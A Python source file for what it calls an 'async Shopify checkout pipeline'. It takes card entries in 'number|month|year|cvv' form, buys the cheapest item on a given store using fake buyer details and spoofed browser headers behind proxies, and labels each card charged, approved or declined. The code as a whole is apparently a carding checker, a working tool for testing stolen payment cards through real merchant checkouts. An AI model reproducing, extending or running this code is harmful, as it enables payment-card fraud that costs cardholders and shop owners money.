#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Async Shopify checkout pipeline — aiohttp + inline GraphQL."""
import asyncio
import html as html_mod
import json
import re
import urllib.parse

import aiohttp

from addresses import address_for_country, generate_random_email
from extraction import (
    extract_between,
    extract_commit_sha,
    extract_identification_signature,
    extract_queue_token,
    extract_session_token,
    extract_source_token,
    extract_stable_id,
    is_captcha_required,
)
from graphql_docs import (
    MUTATION_SUBMIT,
    QUERY_POLL,
    QUERY_PROPOSAL_DELIVERY,
    QUERY_PROPOSAL_SHIPPING,
)
from tls_client import TLSClient


class CheckStatus:
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


class CheckResult:
    def __init__(self, card: str, status: int = CheckStatus.ERROR):
        self.card:         str  = card
        self.status:       int  = status
        self.status_code:  str  = ""
        self.amount:       str  = ""
        self.currency:     str  = ""
        self.site_name:    str  = ""
        self.shop_url:     str  = ""
        self.receipt_url:  str  = ""
        self.error:        Exception = None
        self.retryable:    bool = False
        self.gateway:      str  = "Shopify Payments"


def _parse_card_entry(card_entry: str):
    parts = card_entry.strip().split("|")
    if len(parts) != 4:
        raise Exception(f"invalid card format: {card_entry}")
    try:
        month = int(parts[1])
        year  = int(parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year: {e}")
    return parts[0], month, year, parts[3]


def _find_cheapest_product_sync(shop_url: str, proxy_url: str = "") -> tuple:
    client = TLSClient(timeout=20, proxy_url=proxy_url or "")
    try:
        best_price = float("inf")
        title = variant_id = price_str = ""
        page = 1
        while page <= 20:
            for attempt in range(3):
                resp = client.get(f"{shop_url}/products.json?limit=250&page={page}")
                if resp.status_code == 200:
                    break
                if resp.status_code in (503, 502, 429, 500) and attempt < 2:
                    import time as _t
                    _t.sleep(2 + attempt * 2)
                    continue
                raise Exception(f"GET products.json page {page} returned {resp.status_code}")
            products = resp.json().get("products", [])
            if not products:
                break
            for p in products:
                for v in p.get("variants", []):
                    if not v.get("available", False):
                        continue
                    try:
                        price = float(v.get("price") or 0)
                    except (ValueError, TypeError):
                        continue
                    if price < 0.01:
                        continue
                    if price < best_price:
                        best_price = price
                        title      = p.get("title", "")
                        variant_id = str(v.get("id", ""))
                        price_str  = v.get("price", "")
            page += 1
        if not title:
            raise Exception(f"No available products above $0.01 at {shop_url}")
        return title, variant_id, price_str
    finally:
        client.close()


async def _make_gql_request(session, graphql_url, params, headers, json_data, max_retries=1):
    last_err = ""
    for attempt in range(max_retries + 1):
        try:
            resp = await session.post(graphql_url, params=params, headers=headers, json=json_data)
            text = await resp.text()
            return resp, text
        except Exception as exc:
            last_err = str(exc)
            if attempt < max_retries:
                await asyncio.sleep(0.2)
    return None, last_err


async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    result = CheckResult(card=card_entry, status=CheckStatus.ERROR)
    result.shop_url  = shop_url
    result.site_name = shop_url.replace("https://", "").replace("http://", "")

    try:
        card_number, card_month, card_year, card_cvv = _parse_card_entry(card_entry)
    except Exception as exc:
        result.error = exc
        return result

    _cn = card_number.replace(" ", "").replace("-", "")
    if (_cn[:4] == "6011" or _cn[:2] == "65"
            or (len(_cn) >= 6 and 622126 <= int(_cn[:6]) <= 622925)
            or (len(_cn) >= 3 and 644 <= int(_cn[:3]) <= 649)):
        result.status      = CheckStatus.DECLINED
        result.status_code = "Unsupported card brand: discover"
        result.error       = Exception("Unsupported card brand: discover")
        return result

    proxy = proxy_url or None
    ourl  = shop_url if shop_url.startswith("http") else f"https://{shop_url}"

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": ourl,
        "Referer": ourl,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout   = aiohttp.ClientTimeout(total=120)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

            # ─── Step 0: find product ─────────────────────────────
            try:
                pinfo = await asyncio.wait_for(
                    asyncio.to_thread(_find_cheapest_product_sync, ourl, proxy_url or ""),
                    timeout=25,
                )
                _, variant_id, price = pinfo
                result.amount = price
            except asyncio.TimeoutError:
                result.retryable = False
                result.error = Exception("Step 0 failed: timeout finding product")
                return result
            except Exception as exc:
                err_str = str(exc)
                site_block = any(x in err_str for x in (
                    "402", "403", "401", "404",
                    "Expecting value", "all products sold out", "no products",
                ))
                result.retryable = not site_block
                result.error = Exception(f"Step 0 failed: {exc}")
                return result

            # ─── Step 1: cart → checkout ──────────────────────────
            try:
                cart_url          = ourl + "/cart/add.js"
                checkout_url_path = ourl + "/checkout/"

                cart_headers = {**base_headers,
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Accept": "application/json, text/javascript"}

                cart_resp = await session.post(cart_url,
                                               data=f"id={variant_id}&quantity=1",
                                               headers=cart_headers, proxy=proxy)

                if cart_resp.status == 429:
                    await asyncio.sleep(1.5)
                    cart_resp = await session.post(
                        cart_url,
                        json={"items": [{"id": int(variant_id), "quantity": 1}]},
                        headers={**base_headers, "Content-Type": "application/json"},
                        proxy=proxy)
                elif cart_resp.status != 200:
                    cart_resp = await session.post(
                        cart_url,
                        json={"items": [{"id": int(variant_id), "quantity": 1}]},
                        headers={**base_headers, "Content-Type": "application/json"},
                        proxy=proxy)

                if cart_resp.status != 200:
                    st = cart_resp.status
                    result.retryable = st not in (401, 403, 429, 451)
                    result.error = Exception(f"Step 1 failed: cart status {st}")
                    return result

                co_hdrs = {**base_headers,
                           "Accept": "text/html,application/xhtml+xml,*/*",
                           "sec-fetch-dest": "document",
                           "sec-fetch-mode": "navigate",
                           "sec-fetch-site": "same-origin",
                           "sec-fetch-user": "?1"}

                co_resp      = await session.post(checkout_url_path,
                                                  allow_redirects=True,
                                                  headers=co_hdrs, proxy=proxy)
                checkout_url = str(co_resp.url)
                html_text    = await co_resp.text()

                if "login" in checkout_url.lower():
                    result.error = Exception("Site requires login")
                    return result

                html_unesc = html_mod.unescape(html_text)

                attempt_token_m = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
                attempt_token   = (attempt_token_m.group(1) if attempt_token_m
                                   else checkout_url.split("/")[-1].split("?")[0])

                sst = (co_resp.headers.get("X-Checkout-One-Session-Token")
                       or co_resp.headers.get("x-checkout-one-session-token"))
                if not sst:
                    sst = extract_session_token(html_text)
                if not sst:
                    result.retryable = True
                    result.error = Exception("Step 1 failed: no session token")
                    return result

                queue_token = extract_queue_token(html_text) or ""
                stable_id_a = extract_stable_id(html_text)

                merch = (re.search(r"ProductVariantMerchandise/(\d+)", html_unesc).group(1)
                         if re.search(r"ProductVariantMerchandise/(\d+)", html_unesc)
                         else str(variant_id))

                if not stable_id_a:
                    result.retryable = True
                    result.error = Exception("Step 1 failed: stableId missing from checkout HTML")
                    return result

                currency = "USD"
                if 'currencyCode&quot;:&quot;' in html_text:
                    currency = extract_between(html_text, 'currencyCode&quot;:&quot;', '&quot;') or "USD"
                elif '"currencyCode":"' in html_text:
                    currency = extract_between(html_text, '"currencyCode":"', '"') or "USD"
                result.currency = currency

                subtotal = extract_between(
                    html_text,
                    'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                    '&quot;')
                if not subtotal:
                    subtotal = extract_between(
                        html_text,
                        '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"',
                        '"')
                if not subtotal:
                    pm = re.search(r'"price":\s*"([\d.]+)"', html_text)
                    subtotal = pm.group(1) if pm else "0.01"

                build_id  = extract_commit_sha(html_text)
                src_tok   = extract_source_token(html_text)
                ident_sig = extract_identification_signature(html_text)

                base_headers.update({
                    "shopify-checkout-client": "checkout-web/1.0",
                    "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                    "x-checkout-one-session-token": sst,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                })
                if build_id:
                    base_headers["x-checkout-web-build-id"]        = build_id
                    base_headers["x-checkout-web-deploy-stage"]    = "production"
                    base_headers["x-checkout-web-server-handling"] = "fast"
                    base_headers["x-checkout-web-server-rendering"]= "yes"
                if src_tok:
                    base_headers["x-checkout-web-source-id"] = src_tok

            except Exception as exc:
                result.retryable = True
                result.error = Exception(f"Step 1 failed: {exc}")
                return result

            addr = address_for_country("US")
            firstName = addr.first_name.capitalize()
            lastName  = addr.last_name.capitalize()
            email     = generate_random_email()
            street    = addr.address1
            city      = addr.city
            state     = addr.zone_code
            s_zip     = addr.postal_code
            phone     = addr.phone
            country_code = addr.country_code
            address2  = addr.address2

            graphql_url = f"https://{urllib.parse.urlparse(ourl).netloc}/checkouts/unstable/graphql"
            params      = {"operationName": "Proposal"}

            # ─── Step 2: shipping proposal ────────────────────────
            try:
                shipping_json = {
                    "query": QUERY_PROPOSAL_SHIPPING,
                    "variables": {
                        "sessionInput": {"sessionToken": sst},
                        "queueToken": queue_token or "",
                    },
                    "operationName": "Proposal",
                }
                for i in range(2):
                    _, resp_text = await _make_gql_request(session, graphql_url, params, base_headers, shipping_json)
                    if i == 0:
                        await asyncio.sleep(0.8)

                if is_captcha_required(resp_text):
                    result.error = Exception("CAPTCHA_REQUIRED")
                    return result

                rj = json.loads(resp_text)
                if "errors" in rj:
                    msgs = "; ".join(e.get("message", str(e)) for e in rj["errors"][:3])
                    result.error = Exception(f"Step 2 GraphQL error: {msgs}")
                    return result

                sess_d   = rj.get("data", {}).get("session", {}) or {}
                neg_res  = (sess_d.get("negotiate", {}) or {}).get("result", {}) or {}
                res_type = neg_res.get("__typename", "")

                if res_type in ("CheckpointDenied", "Throttled", "NegotiationResultFailed"):
                    result.retryable = (res_type == "Throttled")
                    result.error = Exception(res_type)
                    return result

                checkpoint_data = neg_res.get("checkpointData")
                seller_prop     = neg_res.get("sellerProposal")
                if not seller_prop:
                    result.retryable = True
                    result.error = Exception("Step 2: seller proposal null")
                    return result

                running_total = (seller_prop.get("runningTotal") or {}).get("value", {}).get("amount", "0.00")

                delivery_data = seller_prop.get("delivery") or {}
                delivery_strategy = ""
                shipping_amount   = 0.0
                if delivery_data.get("__typename") == "FilledDeliveryTerms":
                    d_lines = delivery_data.get("deliveryLines", [{}])
                    if d_lines:
                        avail = d_lines[0].get("availableDeliveryStrategies", [])
                        if avail:
                            delivery_strategy = avail[0].get("handle", "")
                            try:
                                shipping_amount = float(
                                    avail[0].get("amount", {}).get("value", {}).get("amount", "0"))
                            except Exception:
                                shipping_amount = 0.0

                tax_data = seller_prop.get("tax") or {}
                tax_amount = 0.0
                if tax_data.get("__typename") == "FilledTaxTerms":
                    try:
                        tax_amount = float(
                            tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
                    except Exception:
                        pass

                payment_data = seller_prop.get("payment") or {}
                payment_identifier = "shopify_payments"
                gateway = "Shopify Payments"
                if payment_data.get("__typename") == "FilledPaymentTerms":
                    for meth in payment_data.get("availablePaymentLines", []):
                        pm = meth.get("paymentMethod", {})
                        if pm.get("paymentMethodIdentifier") or pm.get("name"):
                            payment_identifier = pm.get("paymentMethodIdentifier")
                            gateway = (pm.get("extensibilityDisplayName")
                                       or pm.get("name", "Shopify Payments"))
                            break

            except Exception as exc:
                result.retryable = True
                result.error = Exception(f"Step 2 failed: {exc}")
                return result

            # ─── Step 3: delivery proposal ────────────────────────
            try:
                delivery_json = json.loads(json.dumps(shipping_json))
                delivery_json["query"] = QUERY_PROPOSAL_DELIVERY
                _, del_text = await _make_gql_request(session, graphql_url, params, base_headers, delivery_json)

                if is_captcha_required(del_text):
                    result.error = Exception("CAPTCHA_REQUIRED on delivery")
                    return result

                result.amount  = str(float(running_total) + shipping_amount + tax_amount)
                result.gateway = gateway

            except Exception as exc:
                result.retryable = True
                result.error = Exception(f"Step 3 failed: {exc}")
                return result

            # ─── Step 4: PCI tokenisation ─────────────────────────
            try:
                card_name_str = f"{firstName} {lastName}"
                pci_payload   = {
                    "credit_card": {
                        "number": card_number, "month": int(card_month),
                        "year": int(card_year), "verification_value": card_cvv,
                        "start_month": None, "start_year": None,
                        "issue_number": "", "name": card_name_str,
                    },
                    "payment_session_scope": urllib.parse.urlparse(ourl).netloc,
                }
                vault_headers = {
                    "Content-Type": "application/json", "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin": "https://checkout.pci.shopifyinc.com",
                    "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html",
                    "User-Agent": base_headers["User-Agent"],
                    "sec-ch-ua": base_headers["sec-ch-ua"],
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-storage-access": "active",
                }
                if ident_sig:
                    vault_headers["shopify-identification-signature"] = ident_sig

                async def _post_pci(vault_url):
                    try:
                        r = await session.post(vault_url, json=pci_payload, headers=vault_headers, proxy=proxy)
                        raw = await r.text()
                        if r.status != 200 or not raw.strip().startswith("{"):
                            return None
                        return json.loads(raw).get("id")
                    except Exception:
                        return None

                token = await _post_pci("https://checkout.pci.shopifyinc.com/sessions")
                if not token:
                    token = await _post_pci("https://checkout.pci.shopifycs.com/sessions")
                if not token:
                    result.error = Exception("PCI tokenisation failed: no session id")
                    return result
            except Exception as exc:
                result.error = Exception(f"Step 4 failed: {exc}")
                return result

            # ─── Step 5: submit ───────────────────────────────────
            rid = ""
            try:
                submit_params = {"operationName": "SubmitForCompletion"}
                submit_vars = {
                    "input": {
                        "sessionInput": {"sessionToken": sst},
                        "queueToken": queue_token or "",
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [{
                                "paymentMethod": {
                                    "directPaymentMethod": {
                                        "paymentMethodIdentifier": payment_identifier,
                                        "sessionId": token,
                                        "billingAddress": {
                                            "streetAddress": {
                                                "address1": street, "address2": address2,
                                                "city": city, "countryCode": country_code,
                                                "postalCode": s_zip, "firstName": firstName,
                                                "lastName": lastName, "zoneCode": state, "phone": phone,
                                            }
                                        },
                                        "cardSource": None,
                                    }
                                },
                                "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                                "dueAt": None,
                            }],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": street, "address2": address2,
                                    "city": city, "countryCode": country_code,
                                    "postalCode": s_zip, "firstName": firstName,
                                    "lastName": lastName, "zoneCode": state, "phone": phone,
                                }
                            },
                        },
                        "buyerIdentity": {
                            "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                            "email": email, "emailChanged": False,
                            "phoneCountryCode": country_code,
                            "marketingConsent": [{"email": {"value": email}}],
                            "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                            "rememberMe": False,
                        },
                        "taxes": {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": [],
                        },
                        "tip": {"tipLines": []},
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "optionalDuties": {"buyerRefusesDuties": False},
                    },
                    "attemptToken": attempt_token,
                    "metafields": [],
                    "analytics": {"requestUrl": checkout_url},
                }
                if checkpoint_data:
                    submit_vars["input"]["checkpointData"] = checkpoint_data

                submit_json = {
                    "query": MUTATION_SUBMIT,
                    "variables": submit_vars,
                    "operationName": "SubmitForCompletion",
                }

                _, sub_text = await _make_gql_request(session, graphql_url, submit_params, base_headers, submit_json)

                if is_captcha_required(sub_text):
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "CARD_DECLINED"
                    result.error       = Exception("CARD_DECLINED")
                    return result

                rj2      = json.loads(sub_text)
                sub_data = rj2.get("data", {}).get("submitForCompletion", {})

                if not sub_data:
                    errs2 = rj2.get("errors", [])
                    if errs2:
                        code2 = errs2[0].get("code") or errs2[0].get("message", "")
                        result.status      = CheckStatus.DECLINED
                        result.status_code = str(code2)
                        result.error       = Exception(str(code2))
                        return result
                    result.error = Exception("Empty submit response")
                    return result

                sub_type = sub_data.get("__typename", "")

                if sub_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt_d = sub_data.get("receipt", {})
                    if receipt_d and receipt_d.get("__typename") == "ProcessedReceipt":
                        result.status      = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        return result
                    rid = (receipt_d or {}).get("id", "")

                elif sub_type == "SubmitFailed":
                    reason = sub_data.get("reason", "")
                    msg    = str(reason)[:80] if reason else "SubmitFailed"
                    result.status      = CheckStatus.DECLINED
                    result.status_code = msg
                    result.error       = Exception(msg)
                    return result

                elif sub_type == "SubmitRejected":
                    for e2 in sub_data.get("errors", []):
                        detail = (e2.get("localizedMessage") or e2.get("nonLocalizedMessage")
                                  or e2.get("code") or "SubmitRejected")
                        result.status      = CheckStatus.DECLINED
                        result.status_code = detail
                        result.error       = Exception(detail)
                        return result
                    result.status = CheckStatus.DECLINED
                    result.error  = Exception("SubmitRejected")
                    return result

                elif sub_type == "Throttled":
                    result.retryable = True
                    result.error     = Exception("Throttled")
                    return result

                else:
                    rid = (sub_data.get("receipt") or {}).get("id", "")

                if not rid:
                    result.error = Exception("No receipt ID from submit")
                    return result

            except Exception as exc:
                result.error = Exception(f"Step 5 failed: {exc}")
                return result

            # ─── Step 6: poll ─────────────────────────────────────
            try:
                await asyncio.sleep(0.5)
                poll_params = {"operationName": "PollForReceipt"}
                poll_json   = {
                    "query": QUERY_POLL,
                    "variables": {"receiptId": rid, "sessionToken": sst},
                    "operationName": "PollForReceipt",
                }

                FINAL_CHARGED    = {"ProcessedReceipt", "SuccessfulReceipt"}
                STILL_PROCESSING = {"ProcessingReceipt", "WaitingReceipt"}
                ACTION_REQUIRED  = {"ActionRequiredReceipt"}
                FAILED           = {"FailedReceipt"}

                MAX_POLLS     = 14
                MAX_PROC_WAIT = 20.0
                BASE_DELAY    = 0.6
                MAX_DELAY     = 2.5

                poll_delay   = BASE_DELAY
                proc_elapsed = 0.0
                poll_text    = ""

                for _ in range(MAX_POLLS):
                    _, poll_text = await _make_gql_request(session, graphql_url, poll_params, base_headers, poll_json)

                    if is_captcha_required(poll_text):
                        result.status      = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error       = Exception("CARD_DECLINED")
                        return result

                    try:
                        prj = json.loads(poll_text)
                    except Exception:
                        await asyncio.sleep(poll_delay)
                        poll_delay = min(poll_delay * 1.4, MAX_DELAY)
                        continue

                    rec_d    = (prj.get("data") or {}).get("receipt") or {}
                    rec_type = rec_d.get("__typename", "")

                    if rec_type in FINAL_CHARGED:
                        result.status      = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        conf_url = (rec_d.get("confirmationPage") or {}).get("url") or checkout_url
                        result.receipt_url = conf_url
                        return result

                    if rec_type in ACTION_REQUIRED:
                        result.status      = CheckStatus.APPROVED
                        result.status_code = "OTP_REQUIRED"
                        return result

                    if rec_type in FAILED:
                        err_d    = rec_d.get("processingError") or {}
                        err_type = err_d.get("__typename", "")
                        if err_type == "PaymentFailed":
                            code4 = err_d.get("code", "")
                            msg4  = err_d.get("messageUntranslated", "")
                            if code4 == "INSUFFICIENT_FUNDS":
                                result.status      = CheckStatus.APPROVED
                                result.status_code = "INSUFFICIENT_FUNDS"
                                return result
                            label = code4 or msg4 or "PAYMENT_FAILED"
                            if "CAPTCHA" in label:
                                label = "CARD_DECLINED"
                        elif err_type in ("InventoryReservationFailure", "InventoryClaimFailure"):
                            result.retryable = True
                            result.error     = Exception("INVENTORY_FAILURE")
                            return result
                        else:
                            label = err_d.get("code") or err_type or "PAYMENT_FAILED"
                        result.status      = CheckStatus.DECLINED
                        result.status_code = label
                        result.error       = Exception(label)
                        return result

                    if rec_type in STILL_PROCESSING:
                        proc_elapsed += poll_delay
                        if proc_elapsed >= MAX_PROC_WAIT:
                            result.status    = CheckStatus.ERROR
                            result.error     = Exception("PROCESSING_TIMEOUT")
                            result.retryable = True
                            return result
                        await asyncio.sleep(poll_delay)
                        poll_delay = min(poll_delay * 1.4, MAX_DELAY)
                        continue

                    fl = (poll_text or "").lower()
                    if "processedreceipt" in fl or "order_placed" in fl or "successfulreceipt" in fl:
                        result.status      = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        result.receipt_url = checkout_url
                        return result
                    if "actionrequiredreceipt" in fl or "action_required" in fl:
                        result.status      = CheckStatus.APPROVED
                        result.status_code = "OTP_REQUIRED"
                        return result
                    if "failedreceipt" in fl:
                        fc_m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_text)
                        fc   = fc_m.group(1) if fc_m else "CARD_DECLINED"
                        if "CAPTCHA" in fc:
                            fc = "CARD_DECLINED"
                        result.status      = CheckStatus.DECLINED
                        result.status_code = fc
                        result.error       = Exception(fc)
                        return result

                    await asyncio.sleep(poll_delay)
                    poll_delay = min(poll_delay * 1.4, MAX_DELAY)

                result.status    = CheckStatus.ERROR
                result.retryable = True
                result.error     = Exception("MAX_POLLS_EXCEEDED")

            except Exception as exc:
                result.error = Exception(f"Step 6 failed: {exc}")

    except Exception as exc:
        result.error = Exception(f"Checkout error: {exc}")

    return result